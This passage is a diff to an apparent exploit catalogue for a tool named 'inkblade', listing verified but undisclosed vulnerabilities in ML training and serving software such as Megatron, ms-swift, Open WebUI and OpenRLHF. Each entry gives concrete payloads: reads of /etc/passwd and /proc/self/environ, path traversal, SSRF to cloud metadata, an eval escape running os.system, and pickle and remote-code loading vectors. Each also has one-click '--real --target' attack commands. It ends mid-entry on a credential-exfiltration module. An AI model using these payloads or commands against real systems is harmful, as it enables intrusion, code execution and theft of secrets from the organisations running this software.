+    "dry_run": "inkblade exploit llamafactory-checkpoint-py-torch-load-unsafe-l334-regex --dry-run",
+    "real": "inkblade exploit llamafactory-checkpoint-py-torch-load-unsafe-l334-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "llm2jev-image-file",
+   "component": "llm2jev",
+   "module": "llm2jev-file-read",
+   "surface": "http",
+   "version": "f2bdad6",
+   "affected": "f2bdad6",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "llm2jev f2bdad6 image_url accepts file:// and local paths then reads/parses them; requires the multimodal endpoint.",
+   "default_exposed": false,
+   "exploit": "image_url=file:///etc/passwd / local path -> read and parse image; http(s) -> SSRF",
+   "preconditions": [
+    "LLM2Jev endpoint reachable",
+    "request carries image_url"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-file-uri",
+     "kind": "url",
+     "request": "image_url=file:///etc/passwd",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "image_url": "file:///etc/passwd"
+      }
+     }
+    },
+    {
+     "id": "v2-plain-path",
+     "kind": "url",
+     "request": "image_url=/proc/self/environ",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "image_url": "/proc/self/environ"
+      }
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit llm2jev-image-file --dry-run",
+    "real": "inkblade exploit llm2jev-image-file --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "窃取与数据泄露"
+   }
+  },
+  {
+   "id": "megatron-checkpointing-py-torch-load-any-l1739-regex",
+   "component": "megatron",
+   "module": "megatron-checkpoint-rce",
+   "surface": "http",
+   "version": "core_v0.19.2",
+   "affected": "<17.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "megatron/training/checkpointing.py:1739 torch.load(checkpoint_name) in the local checkpoint loader.",
+   "default_exposed": false,
+   "exploit": "torch.load(checkpoint_name, map_location='cpu') with no weights_only pin inside the Megatron-LM checkpoint loader: a poisoned checkpoint directory executes pickle code on resume. Reproduced against the verbatim pinned checkpointing.py; megatron.* siblings stubbed because megatron-core 0.19.x hard-im",
+   "preconditions": [
+    "attacker can write the Megatron checkpoint directory",
+    "victim resumes training or loads a biencoder checkpoint from it",
+    "torch < 2.6 (weights_only defaults to False)"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "probe",
+     "request": "POST /megatron/load_checkpoint/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-path-case",
+     "kind": "probe",
+     "request": "POST /Megatron/load_checkpoint",
+     "transform": {
+      "op": "path_case"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit megatron-checkpointing-py-torch-load-any-l1739-regex --dry-run",
+    "real": "inkblade exploit megatron-checkpointing-py-torch-load-any-l1739-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "全影响演示",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-eval-escape",
+   "component": "msswift",
+   "module": "msswift-eval-escape",
+   "surface": "file",
+   "version": "4.5.3 / fbc61cf",
+   "affected": "4.5.3",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "ms-swift 4.5.3 eval() of the ranks expression with restricted builtins escapes to code execution; local training argument, no service route.",
+   "default_exposed": false,
+   "exploit": "ranks expression escapes {'__builtins__':{'list','range'}} -> marker code execution",
+   "preconditions": [
+    "WebUI reachable",
+    "attacker controls more_params/device_groups"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-builtins-import",
+     "kind": "expression",
+     "request": "__builtins__.__import__('os').system('id')",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "__builtins__.__import__('os').system('id')"
+      ]
+     }
+    },
+    {
+     "id": "v2-subclasses-gadget",
+     "kind": "expression",
+     "request": "().__class__.__base__.__subclasses__()",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "().__class__.__base__.__subclasses__()"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-eval-escape --dry-run",
+    "real": "inkblade exploit msswift-eval-escape --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-indexed-dataset-py-pickle-loads-l112-ast",
+   "component": "msswift",
+   "module": "msswift-dataset-pickle-rce",
+   "surface": "file",
+   "version": "v4.6.0",
+   "affected": "v4.6.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "swift/dataset/indexed_dataset.py:112 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "ms-swift packing cache loader IndexedDataset.__init__ opens data.idx with pickle.load(f). The cache dir (PACKING_CACHE or the swift cache) is attacker-writable in the shared-storage threat model; whoever plants data.idx gets pickle code execution the next time a training run opens the packed dataset",
+   "preconditions": [
+    "attacker can write the swift packing cache dir (PACKING_CACHE or dataset cache)",
+    "a training job opens the packed IndexedDataset"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-index-pickle",
+     "kind": "cache",
+     "request": "data.idx pickle.load in IndexedDataset.__init__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "data.idx pickle.load in IndexedDataset.__init__"
+      ]
+     }
+    },
+    {
+     "id": "v2-record-pickle",
+     "kind": "cache",
+     "request": "pickle.loads per record in IndexedDataset.__getitem__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "pickle.loads per record in IndexedDataset.__getitem__"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l112-ast --dry-run",
+    "real": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l112-ast --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-indexed-dataset-py-pickle-loads-l112-regex",
+   "component": "msswift",
+   "module": "msswift-dataset-pickle-rce",
+   "surface": "file",
+   "version": "v4.6.0",
+   "affected": "v4.6.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "swift/dataset/indexed_dataset.py:112 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "ms-swift packing cache loader IndexedDataset.__init__ opens data.idx with pickle.load(f). The cache dir (PACKING_CACHE or the swift cache) is attacker-writable in the shared-storage threat model; whoever plants data.idx gets pickle code execution the next time a training run opens the packed dataset",
+   "preconditions": [
+    "attacker can write the swift packing cache dir (PACKING_CACHE or dataset cache)",
+    "a training job opens the packed IndexedDataset"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-index-pickle",
+     "kind": "cache",
+     "request": "data.idx pickle.load in IndexedDataset.__init__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "data.idx pickle.load in IndexedDataset.__init__"
+      ]
+     }
+    },
+    {
+     "id": "v2-record-pickle",
+     "kind": "cache",
+     "request": "pickle.loads per record in IndexedDataset.__getitem__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "pickle.loads per record in IndexedDataset.__getitem__"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l112-regex --dry-run",
+    "real": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l112-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-indexed-dataset-py-pickle-loads-l129-ast",
+   "component": "msswift",
+   "module": "msswift-dataset-pickle-rce",
+   "surface": "file",
+   "version": "v4.6.0",
+   "affected": "v4.6.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "swift/dataset/indexed_dataset.py:129 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "IndexedDataset.__getitem__ deserialises every record with pickle.loads(buffer) straight from the packed data-*.bin shards. Whoever can write the shard files (shared dataset cache, poisoned packing pipeline) executes code on the first __getitem__ during training. Reproduced at function level: upstrea",
+   "preconditions": [
+    "attacker can write the swift packing cache dir (PACKING_CACHE or dataset cache)",
+    "a training job opens the packed IndexedDataset"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-index-pickle",
+     "kind": "cache",
+     "request": "data.idx pickle.load in IndexedDataset.__init__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "data.idx pickle.load in IndexedDataset.__init__"
+      ]
+     }
+    },
+    {
+     "id": "v2-record-pickle",
+     "kind": "cache",
+     "request": "pickle.loads per record in IndexedDataset.__getitem__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "pickle.loads per record in IndexedDataset.__getitem__"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l129-ast --dry-run",
+    "real": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l129-ast --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-indexed-dataset-py-pickle-loads-l129-regex",
+   "component": "msswift",
+   "module": "msswift-dataset-pickle-rce",
+   "surface": "file",
+   "version": "v4.6.0",
+   "affected": "v4.6.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "swift/dataset/indexed_dataset.py:129 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "IndexedDataset.__getitem__ deserialises every record with pickle.loads(buffer) straight from the packed data-*.bin shards. Whoever can write the shard files (shared dataset cache, poisoned packing pipeline) executes code on the first __getitem__ during training. Reproduced at function level: upstrea",
+   "preconditions": [
+    "attacker can write the swift packing cache dir (PACKING_CACHE or dataset cache)",
+    "a training job opens the packed IndexedDataset"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-index-pickle",
+     "kind": "cache",
+     "request": "data.idx pickle.load in IndexedDataset.__init__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "data.idx pickle.load in IndexedDataset.__init__"
+      ]
+     }
+    },
+    {
+     "id": "v2-record-pickle",
+     "kind": "cache",
+     "request": "pickle.loads per record in IndexedDataset.__getitem__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "pickle.loads per record in IndexedDataset.__getitem__"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l129-regex --dry-run",
+    "real": "inkblade exploit msswift-indexed-dataset-py-pickle-loads-l129-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-media-local-read",
+   "component": "msswift",
+   "module": "msswift-media-local-read",
+   "surface": "http",
+   "version": "v4.6.0",
+   "affected": "4.6.0",
+   "deployment_requirement": "default-exposed",
+   "deployment_evidence": "swift/infer_engine/protocol.py:275 opens a request-supplied media path when SWIFT_MEDIA_ALLOWED_DIRS is unset (the default allow-all); served by the normal inference deployment.",
+   "default_exposed": true,
+   "exploit": "image/audio/video local path -> SafeMediaPath default allow-all -> open(path).read() -> base64 returned",
+   "preconditions": [
+    "swift deploy reachable",
+    "SWIFT_MEDIA_ALLOWED_DIRS unset (default)",
+    "request carries a local media path"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-absolute-path",
+     "kind": "path",
+     "request": "media path /etc/passwd",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "image_url": "/etc/passwd"
+      }
+     }
+    },
+    {
+     "id": "v2-dotdot-path",
+     "kind": "path",
+     "request": "media path ../../../../proc/self/environ",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "image_url": "../../../../proc/self/environ"
+      }
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-media-local-read --dry-run",
+    "real": "inkblade exploit msswift-media-local-read --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "窃取与数据泄露"
+   }
+  },
+  {
+   "id": "msswift-torch-utils-py-pickle-loads-l340-ast",
+   "component": "msswift",
+   "module": "msswift-dataset-pickle-rce",
+   "surface": "file",
+   "version": "v4.6.0",
+   "affected": "v4.6.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "swift/utils/torch_utils.py:340 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "swift.utils.torch_utils.Serializer.from_tensor unpickles a byte prefix of a torch tensor (int64 length header + pickle stream). This helper is used to pass objects between ranks/nodes in the megatron trainer path, so a peer who can inject the tensor bytes gets pickle code execution. Reproduced at fu",
+   "preconditions": [
+    "attacker can inject the tensor bytes carried through the rank/node serialization path",
+    "victim deserialises with Serializer.from_tensor"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-index-pickle",
+     "kind": "cache",
+     "request": "data.idx pickle.load in IndexedDataset.__init__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "data.idx pickle.load in IndexedDataset.__init__"
+      ]
+     }
+    },
+    {
+     "id": "v2-record-pickle",
+     "kind": "cache",
+     "request": "pickle.loads per record in IndexedDataset.__getitem__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "pickle.loads per record in IndexedDataset.__getitem__"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-torch-utils-py-pickle-loads-l340-ast --dry-run",
+    "real": "inkblade exploit msswift-torch-utils-py-pickle-loads-l340-ast --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-torch-utils-py-pickle-loads-l340-regex",
+   "component": "msswift",
+   "module": "msswift-dataset-pickle-rce",
+   "surface": "file",
+   "version": "v4.6.0",
+   "affected": "v4.6.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "swift/utils/torch_utils.py:340 deserialises a checkpoint/cache file controlled by the operator or a tenant with write access; no default service route.",
+   "default_exposed": false,
+   "exploit": "swift.utils.torch_utils.Serializer.from_tensor unpickles a byte prefix of a torch tensor (int64 length header + pickle stream). This helper is used to pass objects between ranks/nodes in the megatron trainer path, so a peer who can inject the tensor bytes gets pickle code execution. Reproduced at fu",
+   "preconditions": [
+    "attacker can inject the tensor bytes carried through the rank/node serialization path",
+    "victim deserialises with Serializer.from_tensor"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-index-pickle",
+     "kind": "cache",
+     "request": "data.idx pickle.load in IndexedDataset.__init__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "data.idx pickle.load in IndexedDataset.__init__"
+      ]
+     }
+    },
+    {
+     "id": "v2-record-pickle",
+     "kind": "cache",
+     "request": "pickle.loads per record in IndexedDataset.__getitem__",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "pickle.loads per record in IndexedDataset.__getitem__"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-torch-utils-py-pickle-loads-l340-regex --dry-run",
+    "real": "inkblade exploit msswift-torch-utils-py-pickle-loads-l340-regex --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "msswift-trust-remote-code",
+   "component": "msswift",
+   "module": "msswift-trust-remote-code",
+   "surface": "file",
+   "version": "4.5.3 / fbc61cf",
+   "affected": "4.5.3",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "ms-swift 4.5.3 loads a model's auto_map via trust_remote_code from the operator-controlled model path; execution is in the training/inference process.",
+   "default_exposed": false,
+   "exploit": "malicious model auto_map executes in service process; PyPI 4.5.3 binds 0.0.0.0",
+   "preconditions": [
+    "ms-swift WebUI or swift deploy reachable",
+    "attacker controls model id/path"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-auto-map-config",
+     "kind": "model-dir",
+     "request": "config.json auto_map.AutoModel -> attacker modeling_*.py",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "config.json auto_map.AutoModel -> attacker modeling_*.py"
+      ]
+     }
+    },
+    {
+     "id": "v2-tokenizer-auto-map",
+     "kind": "model-dir",
+     "request": "tokenizer_config.json auto_map.AutoTokenizer -> attacker tokenization_*.py",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "tokenizer_config.json auto_map.AutoTokenizer -> attacker tokenization_*.py"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit msswift-trust-remote-code --dry-run",
+    "real": "inkblade exploit msswift-trust-remote-code --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "onejev-media-ssrf",
+   "component": "onejev",
+   "module": "onejev-ssrf",
+   "surface": "http",
+   "version": "6122519",
+   "affected": "6122519",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "onejev 6122519 fetches a caller-supplied media URL via urllib; requires the multimodal chat endpoint and a reachable internal target.",
+   "default_exposed": false,
+   "exploit": "media URL -> urllib urlopen -> internal service; UA=qev marker",
+   "preconditions": [
+    "OneJev endpoint reachable",
+    "request can carry media URL"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-imds",
+     "kind": "url",
+     "request": "media url -> 169.254.169.254",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "image_url": "http://169.254.169.254/latest/meta-data/"
+      }
+     }
+    },
+    {
+     "id": "v2-loopback",
+     "kind": "url",
+     "request": "media url -> 127.0.0.1:8080",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "image_url": "http://127.0.0.1:8080/internal/health"
+      }
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit onejev-media-ssrf --dry-run",
+    "real": "inkblade exploit onejev-media-ssrf --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "openwebui-code-interpreter-bypass",
+   "component": "open-webui",
+   "module": "open-webui-indirect-injection-exec",
+   "surface": "http",
+   "version": "v0.12.3 / 91ea4e3",
+   "affected": "<=0.11.1",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "Open WebUI v0.12.3 code interpreter must be enabled (features.code_interpreter) and a model must emit the <code_interpreter> block.",
+   "default_exposed": false,
+   "exploit": "importlib.import_module('subprocess') bypasses __import__ patch -> BYPASS-OK uid=1000",
+   "preconditions": [
+    "features.code_interpreter enabled",
+    "indirect prompt injection reaches model output"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-retrieval-case",
+     "kind": "path",
+     "request": "GET /api/v1/Retrieval",
+     "transform": {
+      "op": "path_case"
+     }
+    },
+    {
+     "id": "v2-pct-encode",
+     "kind": "encoding",
+     "request": "GET /api/v1/retrieva%6c",
+     "transform": {
+      "op": "pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit openwebui-code-interpreter-bypass --dry-run",
+    "real": "inkblade exploit openwebui-code-interpreter-bypass --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "openjev-clef-release-module",
+   "component": "openjev",
+   "module": "openjev-clef-release-module",
+   "surface": "file",
+   "version": "b4339c6",
+   "affected": "b4339c6",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "openjev/clef_vllm.py:40 exec_module on a model-provided joint_schema_model.py; requires write access to the shared model cache/PVC.",
+   "default_exposed": false,
+   "exploit": "joint_schema_model.py in model dir -> exec_module -> Python execution",
+   "preconditions": [
+    "attacker can write shared model cache/PVC",
+    "victim loads model"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-model-dir-module",
+     "kind": "model-dir",
+     "request": "joint_schema_model.py next to the model weights",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "joint_schema_model.py next to the model weights"
+      ]
+     }
+    },
+    {
+     "id": "v2-package-shadow",
+     "kind": "package",
+     "request": "attacker package earlier on sys.path than openjev.clef",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "attacker package earlier on sys.path than openjev.clef"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit openjev-clef-release-module --dry-run",
+    "real": "inkblade exploit openjev-clef-release-module --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "窃取与数据泄露"
+   }
+  },
+  {
+   "id": "openrlhf-serve-rm",
+   "component": "openrlhf",
+   "module": "openrlhf-serve-rm",
+   "surface": "http",
+   "version": "0.11.2 / dc2a7ad",
+   "affected": "0.11.2",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "Requires OpenRLHF 0.11.2 started with --serve-rm; the reward-model HTTP server is not part of the default training launch.",
+   "default_exposed": false,
+   "exploit": "unauthenticated reward scoring -> forged training signal",
+   "preconditions": [
+    "serve_rm started",
+    "port 5000 reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-single-score",
+     "kind": "body",
+     "request": "POST /v1/score (one pair)",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "prompt": "INKBLADE",
+       "response": "ok"
+      }
+     }
+    },
+    {
+     "id": "v2-batch-score",
+     "kind": "body",
+     "request": "POST /v1/score (batch)",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "prompt": [
+        "INKBLADE"
+       ],
+       "response": [
+        "ok"
+       ]
+      }
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit openrlhf-serve-rm --dry-run",
+    "real": "inkblade exploit openrlhf-serve-rm --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "openrlhf-vllm-insecure",
+   "component": "openrlhf",
+   "module": "openrlhf-vllm-env-force",
+   "surface": "file",
+   "version": "0.11.2 / dc2a7ad",
+   "affected": "0.11.2",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "OpenRLHF 0.11.2 forces vLLM insecure serialization through env/config; the pickle IPC is enabled by that training deployment setting.",
+   "default_exposed": false,
+   "exploit": "insecure serialization re-enables pickle IPC -> RCE on flat network",
+   "preconditions": [
+    "OpenRLHF rollout with vLLM",
+    "network peer can reach IPC/dev surface"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-insecure-serialization-env",
+     "kind": "env",
+     "request": "VLLM_ALLOW_INSECURE_SERIALIZATION=1",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "VLLM_ALLOW_INSECURE_SERIALIZATION=1"
+      ]
+     }
+    },
+    {
+     "id": "v2-ipc-method-override",
+     "kind": "env",
+     "request": "VLLM_WORKER_MULTIPROC_METHOD=spawn + pickle IPC channel",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "VLLM_WORKER_MULTIPROC_METHOD=spawn + pickle IPC channel"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit openrlhf-vllm-insecure --dry-run",
+    "real": "inkblade exploit openrlhf-vllm-insecure --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "sglang-omni-admin-failopen",
+   "component": "sglang-omni",
+   "module": "sglang-omni-profiler-write",
+   "surface": "http",
+   "version": "HEAD 204ba29",
+   "affected": "<=0.5.22",
+   "deployment_requirement": "default-exposed",
+   "deployment_evidence": "sglang_omni/http/admin_auth.py:28 returns _no_auth when SGLANG_OMNI_ADMIN_KEY is unset; POST /start_profile accepts event_dir and writes JSONL under it.",
+   "default_exposed": true,
+   "exploit": "POST /start_profile with event_dir=attacker path -> 200; /pause_generation and /update_weights_from_disk -> 200",
+   "preconditions": [
+    "no SGLANG_OMNI_ADMIN_KEY",
+    "admin/profiler port reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /start_profile/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-double-pct",
+     "kind": "encoding",
+     "request": "POST /start%5Fprofile",
+     "transform": {
+      "op": "double_pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit sglang-omni-admin-failopen --dry-run",
+    "real": "inkblade exploit sglang-omni-admin-failopen --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "siliconlab-credential-exfil",
+   "component": "siliconlab",
+   "module": "siliconlab-credential-exfil",
+   "surface": "http",
+   "version": "a08e969",
+   "affected": "a08e969",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "OpenJev-SiliconLabAI server/index.ts:40 evaluate() posts to a caller-supplied base_url/decider_url with the server's provider key; requires the service.",
+   "default_exposed": false,
